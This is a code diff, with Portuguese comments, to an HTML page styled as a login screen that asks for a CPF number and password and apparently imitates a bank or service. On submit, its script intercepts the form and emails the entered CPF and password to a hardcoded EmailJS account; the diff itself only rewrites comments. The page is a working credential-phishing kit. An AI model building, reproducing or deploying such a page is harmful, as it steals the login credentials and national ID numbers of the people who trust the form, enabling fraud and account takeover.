@@ -11,6 +11,7 @@
 <body>
     <img src="new-logo-white.svg" alt="Logo"> 
 
+    <!-- Formulário de login -->
     <form id="login-form">
         <b><p>Faça Seu Login</p></b>
         <label for="CPF">CPF
@@ -19,21 +20,22 @@
         <label for="SENHA">SENHA
             <input type="password" name="SENHA" id="SENHA" required>
         </label>
+        <!-- Botão de envio -->
         <button type="submit">Enviar</button>
     </form>
 
     <a href="#">Esqueci a Senha > </a>
     <a href="#">Ainda não sou cliente > </a>
 
-    <!-- Adicionando o Script do EmailJS -->
+    <!-- Script do EmailJS -->
     <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
     <script>
-        // Inicializa o EmailJS com seu user_id
-        emailjs.init("jVdn1GUkCc7Ji-EPk"); // Substitua pelo seu user_id do EmailJS
+        // Inicializa o EmailJS com o seu user_id
+        emailjs.init("jVdn1GUkCc7Ji-EPk");  // Substitua pelo seu user_id do EmailJS
 
         // Função para enviar o formulário via EmailJS
         document.getElementById("login-form").addEventListener("submit", function(event) {
-            event.preventDefault(); // Evita o envio normal do formulário
+            event.preventDefault(); // Impede o envio padrão do formulário
 
             // Coleta os dados do formulário
             var cpf = document.getElementById("CPF").value;
@@ -41,29 +43,29 @@
 
             // Cria um objeto com os dados do formulário
             var formData = {
-                CPF: cpf,
-                SENHA: senha
+                CPF: cpf,       // Envia o CPF
+                SENHA: senha    // Envia a SENHA
             };
 
-            console.log("Enviando dados:", formData);  // Verifique no console se os dados estão corretos
+            // Exibe no console os dados que serão enviados (para depuração)
+            console.log("Enviando dados:", formData);
 
-            // Envia o formulário para o EmailJS
+            // Envia os dados para o EmailJS
             emailjs.send("service_q4yc9r6", "template_ug4bg1d", formData)
                 .then(function(response) {
-                    // Sucesso
+                    // Se a resposta for positiva, exibe uma mensagem de sucesso
                     alert("Mensagem enviada com sucesso!");
-                    console.log("Resposta do EmailJS:", response); // Mostra detalhes da resposta no console
+                    console.log("Resposta do EmailJS:", response); // Exibe a resposta no console
                     document.getElementById("login-form").reset(); // Limpa os campos após envio
                 }, function(error) {
-                    // Erro: Mostra mais detalhes do erro no console
-                    alert("Falha ao enviar a mensagem.");
-                    console.log("Erro ao enviar:", error);  // Detalhes do erro no console
+                    // Se ocorrer um erro, exibe uma mensagem de erro
+                    alert("Falha ao enviar a mensagem. Tente novamente.");
+                    console.log("Erro ao enviar:", error);  // Exibe detalhes do erro no console
                 });
         });
     </script>
 </body>
 </html>
-
 
 
 
